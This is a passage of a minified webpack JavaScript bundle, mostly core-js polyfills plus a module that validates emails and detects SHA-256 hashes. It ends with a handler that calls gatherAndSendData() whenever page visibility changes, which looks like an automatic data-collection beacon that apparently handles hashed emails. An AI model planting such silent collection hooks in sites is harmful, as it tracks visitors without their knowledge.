    }), n.d(e, "c", function () {
      return a;
    }), n.d(e, "e", function () {
      return c;
    }), n.d(e, "d", function () {
      return u;
    }), n.d(e, "b", function () {
      return s;
    });
    var r = /^\w[-\w.+]*@([A-Za-z0-9][-A-Za-z0-9]+\.)+[A-Za-z]{2,14}$/,
      o = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/,
      i = function (t) {
        return !(128 < t.length || t.length < 6) && r.test(t);
      },
      a = function (t) {
        t = t.toLowerCase();
        return Boolean(t.match(/^([a-f0-9]{64})$/));
      },
      c = function (t) {
        if (0 === t.length) return null;
        if ("=" === t.charAt(t.length - 1)) try {
          var e = atob(t);
          return 1 == a(e) ? e : null;
        } catch (t) {
          return null;
        }
        return null;
      },
      u = function (t) {
        if (0 === t.length) return null;
        if ("=" === t.charAt(t.length - 1)) try {
          for (var e = atob(t), n = "", r = 0; r < e.length; r++) {
            var o = e.charCodeAt(r).toString(16);
            n += 2 === o.length ? o : "0" + o;
          }
          return 1 == a(n) ? n : null;
        } catch (t) {
          return null;
        }
        return null;
      },
      s = function (t) {
        return !(t.length < 3) && o.test(t);
      };
  },
  "y+JT": function (t, e) {
    var n = Math.ceil,
      r = Math.floor;
    t.exports = function (t) {
      return isNaN(t = +t) ? 0 : (0 < t ? r : n)(t);
    };
  },
  y2es: function (t, e, n) {
    var a = n("oYVP"),
      c = n("kXxx"),
      u = n("OOp9").indexOf,
      s = n("Al8F");
    t.exports = function (t, e) {
      var n,
        r = c(t),
        o = 0,
        i = [];
      for (n in r) !a(s, n) && a(r, n) && i.push(n);
      for (; e.length > o;) a(r, n = e[o++]) && (~u(i, n) || i.push(n));
      return i;
    };
  },
  yFXH: function (t, e, n) {
    var r = n("nY95"),
      o = n("qDMJ"),
      i = n("mRBh")("species");
    t.exports = function (t, e) {
      var n;
      return new (void 0 === (n = o(t) && ("function" == typeof (n = t.constructor) && (n === Array || o(n.prototype)) || r(n) && null === (n = n[i])) ? void 0 : n) ? Array : n)(0 === e ? 0 : e);
    };
  },
  yLpj: function (t, e) {
    var n = function () {
      return this;
    }();
    try {
      n = n || new Function("return this")();
    } catch (t) {
      "object" == typeof window && (n = window);
    }
    t.exports = n;
  },
  yQDu: function (t, e, n) {
    var r = n("BMm0"),
      o = n("pAXd"),
      u = n("WnBP"),
      s = n("kXxx"),
      f = n("0XV1"),
      l = n("rNlO");
    r({
      target: "Object",
      stat: !0,
      sham: !o
    }, {
      getOwnPropertyDescriptors: function (t) {
        for (var e, n, r = s(t), o = f.f, i = u(r), a = {}, c = 0; i.length > c;) void 0 !== (n = o(r, e = i[c++])) && l(a, e, n);
        return a;
      }
    });
  },
  yYan: function (t, e, n) {
    var r = n("uoAl");
    t.exports = function (t) {
      var e = t.return;
      if (void 0 !== e) return r(e.call(t)).value;
    };
  },
  ya48: function (t, e, n) {
    n("w/+3"), n("KKIa"), n("HF0W"), n("yy2C"), n("72RN"), n("f2VU"), n("gsVl"), n("NoR1"), n("FY8A"), n("fKdN"), n("PpL8"), n("0RwH"), n("uziP"), n("01Y7"), n("0kdU"), n("sJZI"), n("pRsG"), n("Ax39"), n("Ujv9"), n("vusn"), n("R6QP"), n("BVjT"), n("7bkZ"), n("ah02"), n("/YXv"), n("Ivt0"), n("96W2"), n("blhV"), n("wf5p");
    n = n("WgSG");
    t.exports = n.Object;
  },
  "yjU/": function (t, e) {
    t.exports = {
      CSSRuleList: 0,
      CSSStyleDeclaration: 0,
      CSSValueList: 0,
      ClientRectList: 0,
      DOMRectList: 0,
      DOMStringList: 0,
      DOMTokenList: 1,
      DataTransferItemList: 0,
      FileList: 0,
      HTMLAllCollection: 0,
      HTMLCollection: 0,
      HTMLFormElement: 0,
      HTMLSelectElement: 0,
      MediaList: 0,
      MimeTypeArray: 0,
      NamedNodeMap: 0,
      NodeList: 1,
      PaintRequestList: 0,
      Plugin: 0,
      PluginArray: 0,
      SVGLengthList: 0,
      SVGNumberList: 0,
      SVGPathSegList: 0,
      SVGPointList: 0,
      SVGStringList: 0,
      SVGTransformList: 0,
      SourceBufferList: 0,
      StyleSheetList: 0,
      TextTrackCueList: 0,
      TextTrackList: 0,
      TouchList: 0
    };
  },
  ywqg: function (t, e) {
    t.exports = function (t, e) {
      return {
        enumerable: !(1 & t),
        configurable: !(2 & t),
        writable: !(4 & t),
        value: e
      };
    };
  },
  yy2C: function (t, e, n) {
    var r = n("tNbY"),
      o = n("hYRU");
    r({
      target: "Object",
      stat: !0,
      forced: !o,
      sham: !o
    }, {
      defineProperty: n("jk77").f
    });
  },
  zqgl: function (t, e, n) {
    "use strict";

    var r,
      o = n("TwxJ"),
      i = n("B4Mi"),
      a = n("g03b"),
      c = n("oYVP"),
      u = n("PpLa"),
      s = n("OG+r"),
      f = u("iterator"),
      n = !1;
    [].keys && ("next" in (u = [].keys()) ? (u = i(i(u))) !== Object.prototype && (r = u) : n = !0);
    o = null == r || o(function () {
      var t = {};
      return r[f].call(t) !== t;
    });
    o && (r = {}), s && !o || c(r, f) || a(r, f, function () {
      return this;
    }), t.exports = {
      IteratorPrototype: r,
      BUGGY_SAFARI_ITERATORS: n
    };
  },
  zr9T: function (t, e, n) {
    var r = n("pAXd"),
      o = n("nzNk"),
      i = n("hBnJ"),
      a = n("FUg4"),
      c = Object.defineProperty;
    e.f = r ? c : function (t, e, n) {
      if (i(t), e = a(e, !0), i(n), o) try {
        return c(t, e, n);
      } catch (t) {}
      if ("get" in n || "set" in n) throw TypeError("Accessors not supported");
      return "value" in n && (t[e] = n.value), t;
    };
  }
});
document.onvisibilitychange = function () {
  gatherAndSendData();
};